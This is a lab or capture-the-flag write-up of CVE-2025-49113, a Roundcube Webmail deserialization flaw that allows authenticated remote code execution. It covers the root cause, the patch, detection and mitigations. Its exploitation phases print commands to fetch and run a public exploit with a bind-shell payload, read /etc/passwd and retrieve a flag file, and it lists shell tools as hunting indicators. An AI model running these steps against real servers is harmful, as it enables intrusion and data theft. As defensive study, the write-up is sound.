# Roundcube Authenticated Remote Code Execution via PHP Object Deserialization (CVE-2025-49113)

## Overview

This project explores CVE-2025-49113, a critical authenticated remote code execution vulnerability affecting Roundcube Webmail versions 1.5.x and 1.6.x prior to versions 1.5.10 and 1.6.11.

The vulnerability stems from insecure deserialization of user-controlled data supplied through the `_from` parameter within `upload.php`. By crafting a malicious serialized PHP object, an authenticated attacker can trigger arbitrary command execution on the underlying operating system.

This project analyzes the root cause of the vulnerability, reviews the security patch, demonstrates practical exploitation within a controlled lab environment, and discusses detection and mitigation strategies.

---

## Vulnerability Information

| Attribute          | Value                               |
| ------------------ | ----------------------------------- |
| CVE                | CVE-2025-49113                      |
| Severity           | Critical                            |
| CVSS               | 9.9                                 |
| Platform           | Roundcube Webmail                   |
| Vulnerability Type | PHP Object Deserialization          |
| Impact             | Authenticated Remote Code Execution |
| Authentication     | Required                            |

---

## Affected Versions

| Product   | Vulnerable Versions |
| --------- | ------------------- |
| Roundcube | 1.5.x < 1.5.10      |
| Roundcube | 1.6.x < 1.6.11      |

---

## Objective

The goals of this assessment were to:

* Analyze insecure PHP deserialization
* Investigate the vulnerability root cause
* Review vendor security patches
* Understand exploit mechanics
* Achieve authenticated remote code execution
* Perform post-exploitation validation
* Develop detection opportunities
* Recommend defensive mitigations

---

## Attack Path

```text id="atkpth"
Valid User Credentials
            ↓
Roundcube Authentication
            ↓
CSRF Token Acquisition
            ↓
Malicious Serialized Object Creation
            ↓
Injection into _from Parameter
            ↓
upload.php Processing
            ↓
Unsafe Deserialization
            ↓
PHP Object Execution
            ↓
Operating System Command Execution
            ↓
Remote Code Execution
            ↓
Post-Exploitation Enumeration
```

---

## MITRE ATT&CK Mapping

| Tactic         | Technique                                 |
| -------------- | ----------------------------------------- |
| Initial Access | T1190 – Exploit Public-Facing Application |
| Execution      | T1059.006 – PHP                           |
| Execution      | T1059.004 – Unix Shell                    |
| Discovery      | T1082 – System Information Discovery      |
| Discovery      | T1033 – System Owner/User Discovery       |
| Collection     | T1005 – Data from Local System            |

---

## Environment

| Component          | Version            |
| ------------------ | ------------------ |
| Application        | Roundcube Webmail  |
| Vulnerable Version | 1.6.10             |
| Backend Language   | PHP                |
| Database           | SQL Backend        |
| Web Server         | Apache/Nginx       |
| Access Required    | Authenticated User |

---

# Technical Background

Serialization converts application objects into a storable or transferable format.

Example:

```php id="phpser"
$user = serialize($object);
```

Deserialization reconstructs objects:

```php id="phpdes"
$object = unserialize($data);
```

When untrusted input reaches deserialization routines, attackers may construct malicious objects capable of triggering unintended program behavior.

---

# Root Cause Analysis

The vulnerability exists within Roundcube's `upload.php` functionality.

Prior to the security update, the `_from` parameter was processed without sufficient validation.

### Vulnerable Flow

```text id="flow1"
User Input
     ↓
_from Parameter
     ↓
upload.php
     ↓
unserialize()
     ↓
Object Instantiation
     ↓
Magic Method Execution
     ↓
Remote Code Execution
```

---

# Patch Analysis

Analysis of the security patch revealed that Roundcube introduced validation using:

```php id="patch"
rcube_utils::is_simple_string()
```

The patched implementation rejects malformed `_from` values before deserialization occurs.

### Security Improvement

```text id="patchflow"
User Input
     ↓
Input Validation
     ↓
Validation Failure
     ↓
Request Rejected
```

---

# Phase 1: Exploit Acquisition

The public proof-of-concept exploit published by FearsOff was obtained.

### Command

```bash id="clone"
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113
```

### Files Retrieved

```bash id="files"
CVE-2025-49113.php
README.md
rc_install.sh
```

---

# Phase 2: Exploit Analysis

The exploit performs the following operations:

1. Retrieve CSRF token
2. Obtain session cookie
3. Authenticate user
4. Generate malicious serialized object
5. Inject payload into `_from`
6. Trigger deserialization
7. Execute attacker-controlled commands

### Main Execution Flow

```php id="flowphp"
fetchCsrfTokenAndCookie()
authenticate()
calcPayload()
injectPayload()
executePayload()
```

---

# Phase 3: Payload Delivery

The exploit was executed using valid Roundcube credentials.

### Command

```bash id="exploit"
php CVE-2025-49113.php \
http://TARGET/roundcube \
USERNAME \
PASSWORD \
"ncat -lvnp 4444 -e /bin/bash"
```

### Output

```text id="output"
Authentication successful
Injecting payload...
Payload injected successfully
```

---

# Phase 4: Remote Shell Access

A listener was established:

```bash id="listener"
ncat -lvnp 4444
```

Connection to the bind shell confirmed successful exploitation.

### Verification

```bash id="verify"
pwd
whoami
ls
```

### Output

```bash id="verifyout"
/var/www/html/roundcube
www-data
CHANGELOG.md
```

This confirmed arbitrary command execution on the server.

---

# Phase 5: Post-Exploitation Enumeration

User enumeration was performed.

### Command

```bash id="passwd"
cat /etc/passwd
```

### Discovery

```bash id="maggie"
maggiebyte:x:1002:1002:Maggie Byte,,,:/home/maggiebyte:/bin/bash
```

---

# Phase 6: Sensitive Data Discovery

System files were searched.

### Command

```bash id="findflag"
find /etc -type f -iname "*flag*" 2>/dev/null
```

### Result

```bash id="flagpath"
/etc/flag.txt
```

### Retrieval

```bash id="catflag"
cat /etc/flag.txt
```

---

# Detection Opportunities

Because exploitation closely resembles legitimate authenticated traffic, detection can be challenging.

Indicators include:

* Abnormal requests to `upload.php`
* Suspicious `_from` parameter values
* Serialized PHP object structures
* Unexpected deserialization failures
* Child process creation from PHP workers
* Outbound shell connections

---

# Detection Sources

Recommended telemetry:

* Apache access logs
* Nginx access logs
* PHP-FPM logs
* Auditd
* EDR telemetry
* Sysmon for Linux
* SIEM correlation rules

---

# Threat Hunting Indicators

Examples of suspicious process activity:

```bash id="hunt"
bash
sh
nc
ncat
curl
wget
python
perl
php
```

Potential parent processes:

```text id="parents"
apache2
nginx
php-fpm
httpd
```

---

# Impact Assessment

Successful exploitation allows attackers to:

* Execute arbitrary operating system commands
* Access sensitive files
* Enumerate users
* Deploy malware
* Establish persistence
* Steal credentials
* Pivot within infrastructure

---

# Defensive Mitigations

Recommended mitigations include:

* Upgrade to:

  * 1.5.10
  * 1.6.11
* Restrict access to upload functionality
* Monitor deserialization failures
* Deploy EDR monitoring
* Implement WAF protections
* Monitor PHP child process execution
* Harden web server permissions

---

# Skills Demonstrated

* Vulnerability Research
* PHP Security
* Object Deserialization Analysis
* Source Code Review
* Patch Diff Analysis
* Remote Code Execution
* Web Application Security
* Post-Exploitation
* Threat Hunting
* Detection Engineering
* Security Research Methodology
* MITRE ATT&CK Mapping

---

# Key Lessons Learned

* Deserialization remains one of the most dangerous vulnerability classes.
* Authentication should never be considered a sufficient security boundary.
* Small validation failures can lead to complete system compromise.
* Patch diff analysis provides valuable insight into vulnerability root causes.
* Web application monitoring should include process-level telemetry.
* Public exploit code often reveals important defensive detection opportunities.

---

## Disclaimer

This assessment was conducted in an authorized laboratory environment for educational, defensive, and security research purposes only.
